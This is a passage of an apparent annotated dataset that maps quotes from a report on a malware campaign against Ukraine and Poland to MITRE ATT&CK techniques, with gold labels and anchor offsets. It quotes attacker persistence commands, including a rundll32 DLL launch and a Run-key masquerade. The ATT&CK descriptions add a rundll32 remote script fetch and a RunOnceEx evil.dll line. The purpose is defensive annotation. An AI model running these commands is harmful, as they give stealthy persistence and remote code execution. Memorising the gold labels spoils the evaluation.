following command at user logon", "anchor": {"status": "exact", "occurrences": [{"start": 23398, "end": 23492, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C++ DLL implant"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["execution", "persistence", "privilege-escalation"], "attack": {"status": "ok", "msg": "T1053.005 Scheduled Task (ATT&CK v20.0)", "official": "Scheduled Task", "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.", "url": "https://attack.mitre.org/techniques/T1053/005"}, "rel_count": 3, "sequence": null, "extra": {}, "fp": "845b265a9a5e"}, {"id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055", "kind": "entity", "type": "attack-pattern", "name": "Windows Management Instrumentation", "ext_id": "T1047", "label": "gold:required", "quotes": [{"text": "CPU name (using a WMI query);", "anchor": {"status": "exact", "occurrences": [{"start": 10524, "end": 10553, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 1 (`DefenderProtectionScope.log`)"]}, {"start": 18853, "end": 18882, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C# DLL implants"]}]}}], "flags": [{"level": "warn", "code": "quote-ambiguous", "msg": "Citation : ambiguë : 2 occurrences dans l'article. Vérifier que le passage concerne bien cette source."}], "severity": 2, "description": null, "aliases": [], "tactics": ["execution"], "attack": {"status": "ok", "msg": "T1047 Windows Management Instrumentation (ATT&CK v20.0)", "official": "Windows Management Instrumentation", "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.", "url": "https://attack.mitre.org/techniques/T1047"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "e815608ab361"}, {"id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104", "kind": "entity", "type": "attack-pattern", "name": "System Owner/User Discovery", "ext_id": "T1033", "label": "gold:required", "quotes": [{"text": "current user name;", "anchor": {"status": "exact", "occurrences": [{"start": 10558, "end": 10576, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 1 (`DefenderProtectionScope.log`)"]}, {"start": 13358, "end": 13376, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 2 (`sdw9gobh0n.log`, `0x00bac729fe.log`)"]}, {"start": 18887, "end": 18905, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C# DLL implants"]}]}}], "flags": [{"level": "warn", "code": "quote-ambiguous", "msg": "Citation : ambiguë : 3 occurrences dans l'article. Vérifier que le passage concerne bien cette source."}, {"level": "info", "code": "quote-short", "msg": "Citation : très courte (18 caractères)."}], "severity": 2, "description": null, "aliases": [], "tactics": ["discovery"], "attack": {"status": "ok", "msg": "T1033 System Owner/User Discovery (ATT&CK v20.0)", "official": "System Owner/User Discovery", "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.", "url": "https://attack.mitre.org/techniques/T1033"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "ff2857ebac04"}, {"id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5", "kind": "entity", "type": "attack-pattern", "name": "Rundll32", "ext_id": "T1218.011", "label": "gold:required", "quotes": [{"text": "and run using the following command: `rundll32 %APPDATA%\\Microsoft\\System\\ProtectedCertSystem.dll,#1`", "anchor": {"status": "exact", "occurrences": [{"start": 12129, "end": 12230, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 1 (`DefenderProtectionScope.log`)"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1218.011 Rundll32 (ATT&CK v20.0)", "official": "Rundll32", "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks.\n\nThreat actors may also abuse legitimate, signed system DLLs (e.g., zipfldr.dll, ieframe.dll) with rundll32.exe to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.", "url": "https://attack.mitre.org/techniques/T1218/011"}, "rel_count": 5, "sequence": null, "extra": {}, "fp": "cd87d788b4a2"}, {"id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c", "kind": "entity", "type": "attack-pattern", "name": "Standard Encoding", "ext_id": "T1132.001", "label": "gold:required", "quotes": [{"text": "This information is arranged in a JSON-formatted structure, Base64-encoded", "anchor": {"status": "exact", "occurrences": [{"start": 13731, "end": 13805, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 2 (`sdw9gobh0n.log`, `0x00bac729fe.log`)"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["command-and-control"], "attack": {"status": "ok", "msg": "T1132.001 Standard Encoding (ATT&CK v20.0)", "official": "Standard Encoding", "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.", "url": "https://attack.mitre.org/techniques/T1132/001"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "0b867dc64c18"}, {"id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2", "kind": "entity", "type": "attack-pattern", "name": "Match Legitimate Resource Name or Location", "ext_id": "T1036.005", "label": "gold:acceptable", "quotes": [{"text": "For the retrieved next stage, it creates `MicrosoftDefender` with the value: `rundll32 %APPDATA%\\Microsoft\\System\\ProtectedCertSystem.dll,#1`.", "anchor": {"status": "exact", "occurrences": [{"start": 12459, "end": 12601, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 1 (`DefenderProtectionScope.log`)"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1036.005 Match Legitimate Resource Name or Location (ATT&CK v20.0)", "official": "Match Legitimate Resource Name or Location", "description": "Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation.\n\nThis may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.", "url": "https://attack.mitre.org/techniques/T1036/005"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "ce84b14eecb3"}, {"id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41", "kind": "entity", "type": "attack-pattern", "name": "Symmetric Cryptography", "ext_id": "T1573.001", "label": "gold:required", "quotes": [{"text": "This data is concatenated, RC4-encrypted with a 256 bytes key, and Base64-encoded prior to being sent to the C2 server", "anchor": {"status": "exact", "occurrences": [{"start": 19222, "end": 19340, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C# DLL implants"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["command-and-control"], "attack": {"status": "ok", "msg": "T1573.001 Symmetric Cryptography (ATT&CK v20.0)", "official": "Symmetric Cryptography", "description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.", "url": "https://attack.mitre.org/techniques/T1573/001"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "de66d64acba5"}, {"id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64", "kind": "entity", "type": "attack-pattern", "name": "Component Object Model", "ext_id": "T1559.001", "label": "gold:required", "quotes": [{"text": "run the next stage using a `WScript.Shell` object instantiated via the COM API", "anchor": {"status": "exact", "occurrences": [{"start": 20170, "end": 20248, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C# DLL implants"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["execution"], "attack": {"status": "ok", "msg": "T1559.001 Component Object Model (ATT&CK v20.0)", "official": "Component Object Model", "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.", "url": "https://attack.mitre.org/techniques/T1559/001"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "5595ccc2f4cd"}, {"id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1", "kind": "entity", "type": "attack-pattern", "name": "System Information Discovery", "ext_id": "T1082", "label": "gold:required", "quotes": [{"text": "collects the following pieces of information about the compromised system: OS platform identifier and version; hostname;", "anchor": {"status": "normalized", "occurrences": [{"start": 10390, "end": 10519, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 1 (`DefenderProtectionScope.log`)"]}]}}], "flags": [{"level": "info", "code": "quote-normalized", "msg": "Citation : retrouvée après normalisation (typographie ou balisage markdown)."}], "severity": 1, "description": null, "aliases": [], "tactics": ["discovery"], "attack": {"status": "ok", "msg": "T1082 System Information Discovery (ATT&CK v20.0)", "official": "System Information Discovery", "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from Local Storage Discovery which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. Adversaries may leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\n\nSystem Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.", "url": "https://attack.mitre.org/techniques/T1082"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "75fe030d3516"}, {"id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c", "kind": "entity", "type": "attack-pattern", "name": "Deobfuscate/Decode Files or Information", "ext_id": "T1140", "label": "gold:required", "quotes": [{"text": "In this sample, the VBA macro decrypts the DLL and ultimately writes it to `%LOCALAPPDATA%\\Serv\\0x00bac729fe.log`.", "anchor": {"status": "exact", "occurrences": [{"start": 7923, "end": 8037, "section": ["Infection chains", "Infection chain which targeted Ukraine", "XLS spreadsheets", "ПЛАН наповнення СФ_ЗМІНЕНИЙ.xls"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1140 Deobfuscate/Decode Files or Information (ATT&CK v20.0)", "official": "Deobfuscate/Decode Files or Information", "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b or type command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.", "url": "https://attack.mitre.org/techniques/T1140"}, "rel_count": 5, "sequence": null, "extra": {}, "fp": "d31504040274"}, {"id": "attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3", "kind": "entity", "type": "attack-pattern", "name": "Domains", "ext_id": "T1583.001", "label": "gold:required", "quotes": [{"text": "The following table lists the C2 domains used for both the campaign targeting Ukraine and the campaign targeting Poland, since April 2025.", "anchor": {"status": "exact", "occurrences": [{"start": 28243, "end": 28381, "section": ["Infrastructure", "C2 domains"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["resource-development"], "attack": {"status": "ok", "msg": "T1583.001 Domains (ATT&CK v20.0)", "official": "Domains", "description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.\n\nIn addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.", "url": "https://attack.mitre.org/techniques/T1583/001"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "24fced59490a"}, {"id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0", "kind": "entity", "type": "attack-pattern", "name": "System Network Configuration Discovery", "ext_id": "T1016", "label": "gold:required", "quotes": [{"text": "information about the IP address which is used to browse on the Internet", "anchor": {"status": "exact", "occurrences": [{"start": 10772, "end": 10844, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 1 (`DefenderProtectionScope.log`)"]}, {"start": 13590, "end": 13662, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 2 (`sdw9gobh0n.log`, `0x00bac729fe.log`)"]}, {"start": 19081, "end": 19153, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C# DLL implants"]}, {"start": 22458, "end": 22530, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C++ DLL implant"]}]}}], "flags": [{"level": "warn", "code": "quote-ambiguous", "msg": "Citation : ambiguë : 4 occurrences dans l'article. Vérifier que le passage concerne bien cette source."}], "severity": 2, "description": null, "aliases": [], "tactics": ["discovery"], "attack": {"status": "ok", "msg": "T1016 System Network Configuration Discovery (ATT&CK v20.0)", "official": "System Network Configuration Discovery", "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface). On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.", "url": "https://attack.mitre.org/techniques/T1016"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "985457199f67"}, {"id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69", "kind": "entity", "type": "attack-pattern", "name": "Indicator Removal", "ext_id": "T1070", "label": "gold:acceptable", "quotes": [{"text": "and launches an instance of this scheduled task before deleting it.", "anchor": {"status": "exact", "occurrences": [{"start": 24590, "end": 24657, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C++ DLL implant"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1070 Indicator Removal (ATT&CK v20.0)", "official": "Indicator Removal", "description": "Adversaries may selectively delete or modify artifacts generated to reduce indications of their presence and blend in with legitimate activity. Rather than broadly removing evidence, adversaries may target specific artifacts that appear anomalous or are likely to draw scrutiny, while leaving sufficient data intact to maintain the appearance of normal system behavior.\n\nArtifacts such as command histories, log entries, or file metadata may be altered in ways that align with expected user or system activity. Location, format, and type of artifact (such as command or login history) are often platform-specific, allowing adversaries to tailor modifications that minimize suspicion.\n\nThese actions may not prevent detection entirely but can delay recognition of malicious activity or reduce the fidelity of alerts by making events appear benign or consistent with routine operations. Additionally, selectively removed or modified artifacts may still be recoverable through deeper forensic analysis, though their absence or alteration can complicate timeline reconstruction and attribution.", "url": "https://attack.mitre.org/techniques/T1070"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "19f4ef4acf1c"}, {"id": "attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54", "kind": "entity", "type": "attack-pattern", "name": "Web Services", "ext_id": "T1583.006", "label": "gold:acceptable", "quotes": [{"text": "Associated Slack teams IDs appear to match Slack “free subscription” offer", "anchor": {"status": "exact", "occurrences": [{"start": 32858, "end": 32932, "section": ["Infrastructure", "Slack teams"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["resource-development"], "attack": {"status": "ok", "msg": "T1583.006 Web Services (ATT&CK v20.0)", "official": "Web Services", "description": "Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.", "url": "https://attack.mitre.org/techniques/T1583/006"}, "rel_count": 1, "sequence": null, "extra": {}, "fp": "3363da4cb421"}, {"id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d", "kind": "entity", "type": "attack-pattern", "name": "Exfiltration Over C2 Channel", "ext_id": "T1041", "label": "gold:required", "quotes": [{"text": "sends that information to the C2 server", "anchor": {"status": "exact", "occurrences": [{"start": 5788, "end": 5827, "section": ["Infection chains", "Infection chain which targeted Ukraine"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["exfiltration"], "attack": {"status": "ok", "msg": "T1041 Exfiltration Over C2 Channel (ATT&CK v20.0)", "official": "Exfiltration Over C2 Channel", "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "url": "https://attack.mitre.org/techniques/T1041"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "d54a6e54d8ed"}, {"id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279", "kind": "entity", "type": "attack-pattern", "name": "Registry Run Keys / Startup Folder", "ext_id": "T1547.001", "label": "gold:required", "quotes": [{"text": "It establishes persistence using the current user’s “Run” registry key", "anchor": {"status": "exact", "occurrences": [{"start": 5665, "end": 5735, "section": ["Infection chains", "Infection chain which targeted Ukraine"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["persistence", "privilege-escalation"], "attack": {"status": "ok", "msg": "T1547.001 Registry Run Keys / Startup Folder (ATT&CK v20.0)", "official": "Registry Run Keys / Startup Folder", "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\n\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.", "url": "https://attack.mitre.org/techniques/T1547/001"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "226cf9d2aadf"}, {"id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0", "kind": "entity", "type": "attack-pattern", "name": "Tool", "ext_id": "T1588.002", "label": "gold:required", "quotes": [{"text": "The toolset we analyzed notably relies on readily available tools for obfuscation or packing purposes.", "anchor": {"status": "exact", "occurrences": [{"start": 584, "end": 686, "section": ["Summary"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["resource-development"], "attack": {"status": "ok", "msg": "T1588.002 Tool (ATT&CK v20.0)", "official": "Tool", "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec).\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. Tools may also be leveraged for testing – for example, evaluating malware against commercial antivirus or endpoint detection and response (EDR) applications.\n\nTool acquisition may involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries). Threat actors may also crack trial versions of software.", "url": "https://attack.mitre.org/techniques/T1588/002"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "f7102cd4c0e6"}, {"id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a", "kind": "entity", "type": "attack-pattern", "name": "Obfuscated Files or Information", "ext_id": "T1027", "label": "gold:required", "quotes": [{"text": "The obfuscation in this sample is consistent with the use of _MacroPack_ with all options for obfuscation being enabled", "anchor": {"status": "exact", "occurrences": [{"start": 9283, "end": 9402, "section": ["Infection chains", "Infection chain which targeted Ukraine", "XLS spreadsheets", "Список на перевірку 2025-2026.xls"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1027 Obfuscated Files or Information (ATT&CK v20.0)", "official": "Obfuscated Files or Information", "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. Adversaries may also use compressed or archived scripts, such as JavaScript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. Payloads may also be split into 